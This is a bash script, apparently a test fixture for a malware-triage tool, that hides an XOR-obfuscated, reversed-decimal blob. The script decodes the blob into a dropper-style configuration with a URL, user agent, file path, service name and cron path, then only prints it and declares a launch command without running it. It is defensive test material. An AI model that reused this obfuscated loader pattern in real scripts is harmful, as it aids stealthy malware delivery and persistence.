# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_15abc227='173,172,64,3,158,253,172,16,10,205,227,168,70,91,219,189,227,14,95,199,173,172,66,23,220,189,168,83,78,193,187,165,14,74,194,186,226,28,82,219,175,189,126,95,195,167,171,93,89,206,175,244,16,9,206,255,253,67,23,193,169,164,64,74,194,175,174,28,94,198,145,163,70,83,206,190,160,64,89,211,255,240,85,84,218,161,174,126,95,200,175,185,82,70,219,190,164,83,89,220,145,165,82,7,221,171,185,81,91,203,175,177,82,73,202,173,162,83,74,240,166,174,85,91,223,189,164,69,22,195,175,174,78,86,240,171,185,64,89,192,162,240,82,74,202,186,190,93,11,146,184'
readonly Codec_15abc227='reversed_decimal|repeating_key_xor|ce,af,3a,21,cd'

Load_15abc227() {
  item1=()
  local IFS=',' item5
  local -a pieces
  read -r -a pieces <<< "${Material_15abc227}"
  for ((item5=${#pieces[@]}-1; item5>=0; item5--)); do item1+=("${pieces[item5]}"); done
}

Decode_15abc227() {
  item2=()
  local -a key_bytes=(206 175 58 33 205)
  local item5
  for ((item5=0; item5<${#item1[@]}; item5++)); do
    item2+=("$((item1[item5] ^ key_bytes[item5 % ${#key_bytes[@]}]))")
  done
}

Recover_15abc227() {
  local -a item1 item2
  local item3 item4 item8 item5
  local -a compass=(north south); item4="$(IFS=:; printf '%s' "${compass[*]}")"
  Load_15abc227
  item8=0; while ((item8 < 1)); do Decode_15abc227; ((item8+=1)); done
  item3=''
  local octal character
  for item5 in "${!item2[@]}"; do
    printf -v octal '%03o' "${item2[item5]}"
    printf -v character '%b' "\\$octal"
    item3+="$character"
  done
  printf '%s\n' "$item3"
}

Inspect_15abc227() { local recovered; recovered="$(Recover_15abc227)"; printf '%s\n' "$recovered"; }

Plan_15abc227() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_15abc227)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a launch_command=(sh "$file_path")
  declare -p launch_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_15abc227; fi

# reconstruction complete